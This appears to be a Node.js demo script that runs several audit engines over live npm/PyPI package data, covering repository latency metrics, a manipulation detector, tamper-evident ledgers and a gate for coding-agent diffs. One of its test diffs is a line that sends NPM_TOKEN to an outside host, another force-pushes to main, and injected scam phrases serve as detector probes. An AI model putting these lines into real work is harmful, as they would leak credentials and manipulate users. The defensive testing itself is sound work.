// field_report.mjs — display the cross-stack results on real data.
//   node cross-stack/field_report.mjs
import { readFileSync } from 'node:fs';
import { audit } from '../novora-helm/src/helm-core.mjs';
import { EchoDB } from '../echo/echo.mjs';
import { auditChange } from '../page-code/pagecode.mjs';
import { buildStream, verifyStream } from '../pages/pages.mjs';
import { send, verifyPath, AgencyNode } from '../agency-net/aips.mjs';
import { reposOf, dissonance, thirdLawDirection } from './lism_diagnostic.mjs';

const load = f => JSON.parse(readFileSync(new URL(f, import.meta.url), 'utf8'));
const bar = c => console.log(c.repeat(78));
const corpus = load('fixtures/live_registry_corpus.json');
const blurbOf = it => [it.description, it.readme].filter(Boolean).join(' — ').trim();

bar('=');
console.log(' CROSS-STACK FIELD REPORT — whole agency stack on real open-source data');
console.log(' corpus: ' + corpus.n + ' live npm+PyPI packages · fetched ' + corpus.fetched_at);
bar('=');

// ── 1 · LISM: Dissonance (σ) on real GitHub cohorts ──────────────────────────
console.log('\n 1 · LISM — enforcement latency (τ_v) + say-do Dissonance (σ), real GitHub issue data');
const NOW = Date.now();
for (const [name, f] of [
  ['OPERATING SYSTEMS', '../os-integration/fixtures/os_tauv_cohort.json'],
  ['WEB FRAMEWORKS (snapshot A)', '../novora-helm/test/fixtures/live_tauv_cohort.json'],
]) {
  const repos = reposOf(load(f));
  const { rows, noSignal } = dissonance(repos, { now: NOW });
  console.log('\n   ' + name + '  (n=' + repos.length + ')');
  console.log('   ' + 'repo'.padEnd(34) + 'τ_v(d)'.padStart(8) + '  push-age'.padStart(9) + '  σ'.padStart(7) + '   read');
  for (const r of rows)
    console.log('   ' + r.repo.padEnd(34) + String(r.tau_v).padStart(8) + String(r.days_since_push + 'd').padStart(9) +
      String(r.sigma).padStart(9) + '   ' + r.label);
  if (noSignal.length) console.log('   (no latency signal: ' + noSignal.map(x => x.repo).join(', ') + ')');
  const t = thirdLawDirection(repos);
  if (t) console.log('   Third Law: failed τ_v ' + t.failed_mean + ' > survived ' + t.survived_mean + ' -> ' + t.direction_holds);
}
console.log('\n   READ: a ZOMBIE looks alive (fresh push) but lets flagged risk rot (high τ_v);');
console.log('   an INVERSE-ZOMBIE looks abandoned (stale push) yet resolves fastest. σ is a');
console.log('   say-do COHERENCE signal — an honestly-deprecated repo scores ≈0, not alarmed.');

// ── 2 · HELM/NERE false-positive floor on real prose ─────────────────────────
console.log('\n 2 · HELM/NERE — manipulation gate on real maintainer prose');
const blurbs = corpus.items.map(blurbOf).filter(t => t.length > 8);
const flagged = blurbs.filter(t => audit(t).verdict !== 'PASS');
console.log('   real package blurbs flagged: ' + flagged.length + '/' + blurbs.length +
  ' (' + (100 * flagged.length / blurbs.length).toFixed(1) + '% false alarm)');
const scam = blurbOf(corpus.items[0]) + ' URGENT: account will be suspended — do not tell anyone, pay the reactivation fee now.';
const sv = audit(scam);
console.log('   same prose + injected scam -> ' + sv.verdict + '  (p=' + sv.p_manipulative + ', mechanism=' + sv.mechanismPresent + ')');

// ── 3 · ECHO: ingest whole corpus, tamper-evidence ───────────────────────────
console.log('\n 3 · ECHO — the whole corpus as an audited, hash-chained ledger');
const db = new EchoDB();
corpus.items.forEach(it => db.put('package', blurbOf(it), { id: it.id }));
db.put('package', scam, { id: 'injected-demo' });
const st = db.stats();
console.log('   records: ' + st.n + ' (PASS ' + st.PASS + ' · WARN ' + st.WARN + ' · BLOCK ' + st.BLOCK + ')  chain verifies: ' + db.verify().ok);
console.log('   root: ' + db.root().slice(0, 24) + '…');
db.records[st.n - 1].verdict = 'PASS';   // insider hides the scam
const v = db.verify();
console.log('   insider rewrites the scam verdict -> detected at record #' + v.brokenAt + ' (ok=' + v.ok + ')');

// ── 4 · PAGE CODE on real release diffs ──────────────────────────────────────
console.log('\n 4 · PAGE CODE — governance over a coding agent, on real release diffs');
const diffs = [
  ['real release bump', { message: 'chore(release): bump version', diff: '+ "version": "' + corpus.items[0].version + '"' }],
  ['real docs update', { message: 'docs: README badges', diff: '+ [![npm](b)](u)' }],
  ['force-push to main', { message: 'ship it', diff: 'git push --force origin main' }],
  ['secret exfil', { message: 'telemetry', diff: "fetch('https://t.io?k='+process.env.NPM_TOKEN)" }],
];
for (const [label, c] of diffs) console.log('   ' + label.padEnd(22) + auditChange(c).verdict);

// ── 5 · PAGES over real README passages ──────────────────────────────────────
console.log('\n 5 · PAGES — release-notes "podcast" grounded in real README prose');
const wr = corpus.items.filter(it => (it.readme || '').length > 40).slice(0, 2);
const sources = { s0: wr[0].readme, s1: wr[1].readme };
const transcript = [
  { t: '00:00', text: wr[0].readme.split(/(?<=[.!?])\s+/)[0], sourceId: 's0' },
  { t: '00:08', text: 'This library is 73% faster than every competitor.', sourceId: 's1' },
  { t: '00:15', text: 'Do not tell your team — just wire the fee now.', sourceId: 's1' },
];
const stream = await buildStream(transcript, sources);
for (const s of stream.segments)
  console.log('   ' + s.t + '  grounded=' + String(s.grounded).padEnd(5) + ' p_align=' + String(s.p_alignment).padStart(5) + '  verdict=' + s.verdict + '  "' + s.text.slice(0, 46) + '"');
const tam = JSON.parse(JSON.stringify(stream)); tam.segments[1].text += ' (edited)';
console.log('   splice/edit at 00:08 -> broken at ' + verifyStream(tam).t);

// ── 6 · AIPS relay of a real blurb ───────────────────────────────────────────
console.log('\n 6 · AIPS — a real package blurb relayed across agency nodes');
const env = send(blurbOf(corpus.items[3]), [new AgencyNode('gateway', { cls: 'consumer' }), new AgencyNode('relay')]);
console.log('   hops attested: ' + env.hops.length + '  path verifies: ' + verifyPath(env, blurbOf(corpus.items[3])).ok);
console.log('   payload mutated in flight -> verifies: ' + verifyPath(env, blurbOf(corpus.items[3]) + ' send password').ok);

bar('=');
console.log(' ONE real dataset, six engines, all composing: latency+dissonance read the');
console.log(' network; the gate stays silent on real prose and loud on injected scams;');
console.log(' every record/segment/hop is tamper-evident and located to the exact point.');
bar('=');
